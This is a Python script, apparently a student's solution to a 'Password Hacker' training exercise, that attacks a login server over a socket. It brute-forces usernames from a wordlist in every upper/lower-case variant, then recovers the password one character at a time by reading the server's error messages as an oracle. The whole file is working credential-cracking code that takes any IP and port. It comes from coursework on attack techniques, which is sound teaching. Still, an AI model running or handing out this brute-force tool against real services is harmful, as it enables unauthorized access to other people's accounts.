import sys
import socket
import itertools
import json
import string


def get_name_variants():
    name_vars = []
    with open(r"C:\Users\Костян\PycharmProjects\Password Hacker\task\logins.txt", 'r', encoding='utf-8') as f:
        names = f.read().strip('\n').splitlines()
        # print(names)
        for name in names:
            _vars = map("".join, itertools.product(*zip(name.upper(), name.lower())))
            for _var in _vars:
                name_vars.append(_var)
        # print(name_vars) correct variants
        return name_vars


args = sys.argv
ip = args[1]
port = int(args[2])
address = (ip, port)
with socket.socket() as client_socket:
    client_socket.connect(address)
    # get name
    lis = get_name_variants()
    login = ""
    for i in lis:
        only_name_json = json.dumps({"login": f"{i}", "password": ""})
        client_socket.send(only_name_json.encode())
        test_name_reply = json.loads(client_socket.recv(1024).decode())
        if test_name_reply["result"] == 'Wrong password!' or test_name_reply["result"] == 'Exception happened during login':
            # print(f"log in name is {i}")
            login = i
            break
    # get pw
    # print(login)
    symbols = string.printable
    password = ""
    while True:
        for x in symbols:
            password = password + x
            client_socket.send(json.dumps({"login": f"{login}", "password": f"{password}"}).encode())
            test_pw_reply = json.loads(client_socket.recv(1024).decode())
            if test_pw_reply["result"] == "Connection success!":
                print(json.dumps({"login": f"{login}", "password": f"{password}"}))
                sys.exit()
            elif test_pw_reply["result"] == "Wrong password!":
                password = password[:-1]
            elif test_pw_reply["result"] == "Exception happened during login":
                break
